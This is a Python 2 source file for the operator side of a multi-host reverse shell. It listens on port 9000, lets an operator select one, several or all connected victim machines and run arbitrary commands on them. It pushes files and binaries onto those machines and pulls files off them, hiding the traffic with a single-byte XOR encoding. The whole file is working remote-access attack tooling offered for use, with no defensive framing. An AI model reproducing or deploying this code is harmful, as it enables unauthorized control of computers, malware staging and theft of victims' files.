#!/usr/bin/python

import socket
from thread import start_new_thread
import threading
import sys
from time import sleep

def conn_accept(sock,handler):
    while True:
        (client, (ip,port)) = sock.accept()
        handler.add_host(client,(ip,port))

def send_comm(command, cur_host_con):
    encode = bytearray(command)
    for i in range(len(encode)):
        encode[i] ^=0x41
    try:
        cur_host_con.send(encode)
        return 0
    except:
        return 1

def recv_comm(recv_size,cur_host_con):
    en_data = cur_host_con.recv(recv_size)
    decode = bytearray(en_data)
    for i in range(len(decode)):
        decode[i] ^=0x41
    return decode

def Make_File(remoteFileName,fileToRead,cur_host_con,cur_host_id):
    res = send_comm('getFile',cur_host_con)
    if res == 1:
        handler.remove_host(cur_host_id)
        return 1
    res = send_comm(remoteFileName,cur_host_con)
    if res == 1:
        handler.remove_host(cur_host_id)
        return 1
    decode = recv_comm(1024,cur_host_con)
    if decode == "fna":
        return 2
    else:
        fileToRead = open(fileToRead,'r')
        command = fileToRead.read()
        fileToRead.close()
        fSize = len(command) + 1024
        fSize = str(fSize)
        res = send_comm(fSize, cur_host_con)
        if res == 1:
            handler.remove_host(cur_host_id)
            return 1
        res = send_comm(command,cur_host_con)
        if res == 1:
            handler.remove_host(cur_host_id)
            return 1
        decode = recv_comm(1024,cur_host_con)
        return 0

def Make_Binary(remoteBinName, binToRead, cur_host_con, cur_host_id):
    res = send_comm('getBinary',cur_host_con)
    if res == 1:
        handler.remove_host(cur_host_id)
        return 1
    res = send_comm(remoteBinName,cur_host_con)
    if res == 1:
        handler.remove_host(cur_host_id)
        return 1
    decode = recv_comm(1024,cur_host_con)
    if decode == "fna":
        return 2
    else:
        binToRead = open(binToRead,'rb')
        command = binToRead.read()
        binToRead.close()
        bSize = len(command) + 1024
        bSize = str(bSize)
        res = send_comm(bSize,cur_host_con)
        sleep(0.1)
        if res == 1:
            handler.remove_host(cur_host_id)
            return 1
        res = send_comm(command,cur_host_con)
        if res == 1:
            handler.remove_host(cur_host_id)
            return 1
        decode = recv_comm(3072,cur_host_con)
        return 0

def list_root_commands():
    print ("List of Server Commands")
    print ("$List_Commands -> Display this list")
    print ("$List_Hosts -> Display connected hosts")
    print ("$Choose_Host host_no -> Select host from list")
    print ("$Select (commaSeperatedHostIDs) -> Select specified hosts")
    print ("$ALL -> Select all hosts and display available commands")
    print ("$Exit -> Exit this program")

def list_connected_commands():
    print ("List of Commands when Host is Selected")
    print ("$List_Commands -> Display this list")
    print ("$Make_File localFileName (remoteFileName)-> Create remote file")
    print ("$Make_Binary localBinaryName (remoteBinaryName)-> Create remote binary")
    print ("$Pull_File remoteFileName (localFileName)-> Get remote file")
    print ("$Pull_Binary remoteBinaryName (localBinaryName)-> Get remote binary")
    print ("$Close_Connection -> Close Connection and remove host")
    print ("$Exit -> Exit to the main interface")

def list_connected_mult_commands():
    print ("List of Commands when ALL Host are Selected")
    print ("$List_Commands -> Display this list")
    print ("$List_Sel_Hosts -> Display selected hosts")
    print ("$Make_File localFileName (remoteFileName)-> Create remote file")
    print ("$Make_Binary localBinaryName (remoteBinaryName)-> Create remote binary")
    print ("$Close_Connection -> close connection with and remove all selected hosts")
    print ("$Exit -> Exit to the main interface")

class rev_shell_client_main():
    list_of_hosts = []
    def __init__(self):
        self.list_of_hosts = []

    def add_host(self, host, tup):
        self.list_of_hosts.append([host,tup])

    def remove_host(self, host_id):
        self.list_of_hosts.remove(self.list_of_hosts[host_id])

    def return_list_of_hosts(self):
        return self.list_of_hosts

#Start Here!
try:
    max_conns = int(sys.argv[1])
except:
    max_conns = 5

command_dict = {"List_Commands":0,"List_Hosts":1,"Choose_Host":2,"Select":3,"ALL":4,"Exit":5}
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0",9000))
s.listen(max_conns)

handler = rev_shell_client_main()
start_new_thread(conn_accept,(s,handler))

list_root_commands()
while True:
    comm_body = ""
    comm_args = []
    cur_host_ip = ""
    cur_host_id = 0
    command = raw_input("~$ ")
    command = command.split(" ")
    comm_body = command[0]

    #Future Commands may require more than one args
    for i in range(1,len(command)):
        comm_args.append(command[i])
    try:
        translated = command_dict[comm_body]
    except:
        print ("Command not recognised! Try List_Commands for help")
        continue
    if translated == 0:
        list_root_commands()
    elif translated == 1:
        active_hosts = handler.return_list_of_hosts()
        for i in range(len(active_hosts)):
            print ("["+str(i)+"] "+active_hosts[i][1][0]+":"+str(active_hosts[i][1][1]))
    elif translated == 2:
        try:
            cur_host_id = int(comm_args[0])
        except:
            print ("Argument missing or not int")
            continue
        active_hosts = handler.return_list_of_hosts()
        try:
            cur_host_ip = active_hosts[cur_host_id][1][0]
            cur_host_con = active_hosts[cur_host_id][0]
        except:
            print ("Host ID out of bounds")
            continue
        list_connected_commands()
        while True:
            command = raw_input("["+cur_host_ip+"]~$ ")
            command = command.split(" ")
            comm_body = command[0]
            if comm_body == "List_Commands":
                list_connected_commands()
            elif comm_body == "Make_File":
                try:
                    fileToRead = command[1]
                except:
                    print ("Local file not provided")
                    continue
                try:
                    remoteFileName = command[2]
                except:
                    remoteFileName = command[1]
                res = Make_File(remoteFileName, fileToRead, cur_host_con, cur_host_id)
                if res == 1:
                    print ("Connection Closed by client")
                    break
                elif res == 2:
                    print ("Access Denied")
                    continue
                print ("File Transfered Successfully!")
            elif comm_body == "Make_Binary":
                try:
                    binToRead = command[1]
                except:
                    print ("Local binary not provided")
                    continue
                try:
                    remoteBinName = command[2]
                except:
                    remoteBinName = command[1]
                res = Make_Binary(remoteBinName, binToRead, cur_host_con, cur_host_id)
                if res ==  1:
                    print ("Connection Closed by client")
                    break
                elif res == 2:
                    print ("Access Denied")
                    continue
                print ("Binary Transfered Successfully!")
            elif comm_body == "Pull_File":
                try:
                    remoteFileName = command[1]
                except:
                    print ("Remote file name not provided")
                    continue
                res = send_comm('sendFile',cur_host_con)
                if res == 1:
                    print ("Connection closed by client")
                    handler.remove_host(cur_host_id)
                    break
                res = send_comm(remoteFileName,cur_host_con)
                if res == 1:
                    print ("Connection closed by client")
                    handler.remove_host(cur_host_id)
                    break
                decode = recv_comm(1024,cur_host_con)
                if decode == 'fna':
                    print ("File does not exist or Access Denied")
                    continue
                else:
                    try:
                        localFileName = command[2]
                    except:
                        localFileName = command[1]
                    try:
                        localFile = open(localFileName,'w')
                    except:
                        print ("Cannot create local file")
                        continue
                    decode = recv_comm(1024,cur_host_con)
                    decode = recv_comm(int(decode),cur_host_con)
                    localFile.write(decode)
                    localFile.close()
            elif comm_body == "Pull_Binary":
                try:
                    remoteBinName = command[1]
                except:
                    print ("Remote binary name not provided")
                    continue
                res = send_comm('sendBinary',cur_host_con)
                if res == 1:
                    print ("Connection closed by client")
                    handler.remove_host(cur_host_id)
                    break
                res = send_comm(remoteBinName,cur_host_con)
                if res == 1:
                    print ("Connection closed by client")
                    handler.remove_host(cur_host_id)
                    break
                decode = recv_comm(1024,cur_host_con)
                if decode == 'fna':
                    print ("File does not exist or Access Denied")
                    continue
                else:
                    try:
                        localBinName = command[2]
                    except:
                        localBinName = command[1]
                    try:
                        localBin = open(localBinName,'wb')
                    except:
                        print ("Cannot create local file")
                        continue
                    decode = recv_comm(1024,cur_host_con)
                    decode = recv_comm(int(decode),cur_host_con)
                    localBin.write(decode)
                    localBin.close()
            elif comm_body == "Close_Connection":
                cur_host_con.close()
                handler.remove_host(cur_host_id)
                break
            elif comm_body == "Exit":
                break
            else:
                com_reconst = command
                command = ''
                for part in com_reconst:
                    command += part + " "
                command = command[:len(command)-1]
                res = send_comm(command,cur_host_con)
                if res == 1:
                    print ("Connection closed by client")
                    break
                decode = recv_comm(3072,cur_host_con)
                print (decode)
    elif translated == 3:
        try:
            hosts_string = command[1]
        except:
            print ("No host IDs provided")
        list_of_selected_hosts = []
        try:
            hosts_string = hosts_string.split(",")
            for host_ID in hosts_string:
                list_of_selected_hosts.append(int(host_ID.replace(" ","")))
        except:
            print ("Host IDs not integers")
            continue
        list_connected_mult_commands()
        while True:
            command = raw_input("[MULTIPLE]~$ ")
            command = command.split(" ")
            comm_body = command[0]
            if comm_body == "List_Commands":
                list_connected_mult_commands()
            elif comm_body == "List_Sel_Hosts":
                active_hosts = handler.return_list_of_hosts()
                for host_ID in list_of_selected_hosts:
                    print ("["+str(host_ID)+"] "+active_hosts[host_ID][1][0]+":"+str(active_hosts[host_ID][1][1]))
            elif comm_body == "Make_File":
                try:
                    fileToRead = command[1]
                except:
                    print ("Local file not provided")
                    continue
                try:
                    remoteFileName = command[2]
                except:
                    remoteFileName = command[1]
                jobs = []
                active_hosts = handler.return_list_of_hosts()
                for host_at_hand in list_of_selected_hosts:
                    t =threading.Thread(target=Make_File,args=(remoteFileName,fileToRead,active_hosts[host_at_hand][0],host_at_hand))
                    jobs.append(t)
                for j in jobs:
                    j.start()
                for j in jobs:
                    j.join()
                print ("Files Transfered Successfully!")
            elif comm_body == "Make_Binary":
                try:
                    binToRead = command[1]
                except:
                    print ("Local binary not provided")
                    continue
                try:
                    remoteBinName = command[2]
                except:
                    remoteBinName = command[1]
                jobs = []
                active_hosts = handler.return_list_of_hosts()
                for host_at_hand in list_of_selected_hosts:
                    t =threading.Thread(target=Make_Binary,args=(remoteBinName,binToRead,active_hosts[host_at_hand][0],host_at_hand))
                    jobs.append(t)
                for j in jobs:
                    j.start()
                for j in jobs:
                    j.join()
                print ("Binaries Transfered Successfully!")
            elif comm_body == "Close_Connection":
                jobs = []
                active_hosts = handler.return_list_of_hosts()
                for j in range(len(list_of_selected_hosts)-1,-1,-1):
                    host_at_hand = list_of_selected_hosts[j]
                    active_hosts[host_at_hand][0].close()
                    handler.remove_host(host_at_hand)
                break
            elif comm_body == "Exit":
                break
    elif translated == 4:
        active_hosts = handler.return_list_of_hosts()
        list_of_selected_hosts = []
        for host_ID in range(len(active_hosts)):
            list_of_selected_hosts.append(host_ID)
        list_connected_mult_commands()
        while True:
            command = raw_input("[ALL]~$ ")
            command = command.split(" ")
            comm_body = command[0]
            if comm_body == "List_Commands":
                list_connected_mult_commands()
            elif comm_body == "List_Sel_Hosts":
                active_hosts = handler.return_list_of_hosts()
                list_of_selected_hosts = []
                for host_ID in range(len(active_hosts)):
                    list_of_selected_hosts.append(host_ID)
                for i in range(len(active_hosts)):
                    print ("["+str(i)+"] "+active_hosts[i][1][0]+":"+str(active_hosts[i][1][1]))
            elif comm_body == "Make_File":
                try:
                    fileToRead = command[1]
                except:
                    print ("Local file not provided")
                    continue
                try:
                    remoteFileName = command[2]
                except:
                    remoteFileName = command[1]
                jobs = []
                active_hosts = handler.return_list_of_hosts()
                list_of_selected_hosts = []
                for host_ID in range(len(active_hosts)):
                    list_of_selected_hosts.append(host_ID)
                for host_at_hand in list_of_selected_hosts:
                    t =threading.Thread(target=Make_File,args=(remoteFileName,fileToRead,active_hosts[host_at_hand][0],host_at_hand))
                    jobs.append(t)
                for j in jobs:
                    j.start()
                for j in jobs:
                    j.join()
                print ("Files Transfered Successfully!")
            elif comm_body == "Make_Binary":
                try:
                    binToRead = command[1]
                except:
                    print ("Local binary not provided")
                    continue
                try:
                    remoteBinName = command[2]
                except:
                    remoteBinName = command[1]
                jobs = []
                active_hosts = handler.return_list_of_hosts()
                list_of_selected_hosts = []
                for host_ID in range(len(active_hosts)):
                    list_of_selected_hosts.append(host_ID)
                for host_at_hand in list_of_selected_hosts:
                    t =threading.Thread(target=Make_Binary,args=(remoteBinName,binToRead,active_hosts[host_at_hand][0],host_at_hand))
                    jobs.append(t)
                for j in jobs:
                    j.start()
                for j in jobs:
                    j.join()
                print ("Binaries Transfered Successfully!")
            elif comm_body == "Close_Connection":
                active_hosts = handler.return_list_of_hosts()
                list_of_selected_hosts = []
                for host_ID in range(len(active_hosts)):
                    list_of_selected_hosts.append(host_ID)
                for j in range(len(list_of_selected_hosts)-1,-1,-1):
                    host_at_hand = list_of_selected_hosts[j]
                    active_hosts[host_at_hand][0].close()
                    handler.remove_host(host_at_hand)
                break
            elif comm_body == "Exit":
                break
    elif translated == 5:
        sys.exit()
    

